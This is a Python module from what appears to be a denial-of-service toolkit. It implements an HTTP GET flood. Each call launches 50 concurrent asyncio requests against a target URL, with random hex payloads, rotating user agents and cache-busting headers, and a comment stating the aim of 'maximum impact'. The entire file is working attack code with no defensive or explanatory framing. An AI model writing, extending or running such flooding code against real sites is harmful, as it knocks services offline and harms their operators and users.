# Import modules
import asyncio
import aiohttp
import tools.randomData as randomData
from colorama import Fore

# Create async session for connection pooling
_session: aiohttp.ClientSession | None = None


async def _get_session() -> aiohttp.ClientSession:
    """Get or create aiohttp session.
    
    Returns:
        aiohttp ClientSession for async requests
    """
    global _session
    if _session is None or _session.closed:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
        _session = aiohttp.ClientSession(connector=connector)
    return _session


async def _async_flood(target: str) -> None:
    """Send async HTTP GET request to target.
    
    Args:
        target: Target URL string
    """
    payload = randomData.random_bytes(10, 500).hex()
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": randomData.random_useragent(),
    }
    
    try:
        session = await _get_session()
        async with session.get(target, params={"data": payload}, headers=headers, timeout=aiohttp.ClientTimeout(total=4)) as response:
            print(
                f"{Fore.GREEN}[{response.status}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
            )
    except asyncio.TimeoutError:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Connection timed out{Fore.RESET}")
    except aiohttp.ClientError:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Connection error{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}Request error: {e}{Fore.RESET}"
        )


def flood(target: str) -> None:
    """Send HTTP GET requests to target.
    
    Optimized async version using aiohttp for better concurrency.
    
    Args:
        target: Target URL string
    """
    # Run multiple async requests concurrently
    async def run_async_flood():
        tasks = []
        # Create multiple concurrent tasks for maximum impact
        for _ in range(50):
            tasks.append(_async_flood(target))
        await asyncio.gather(*tasks)
    
    try:
        asyncio.run(run_async_flood())
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}HTTP flood interrupted{Fore.RESET}")
    finally:
        # Cleanup session
        global _session
        if _session and not _session.closed:
            asyncio.run(_session.close())
